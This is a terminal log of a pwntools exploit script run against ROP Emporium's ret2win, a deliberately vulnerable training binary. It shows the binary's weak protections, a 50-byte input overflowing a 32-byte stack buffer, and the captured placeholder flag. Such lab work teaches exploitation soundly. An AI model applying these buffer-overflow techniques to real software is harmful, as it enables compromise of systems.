```
$ python exploit.py 
[*] 'rop_emporium/ret2iwin/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './ret2win': pid 6007
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> 
[*] Switching to interactive mode
\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x04ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2win' stopped with exit code 0 (pid 6007)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```
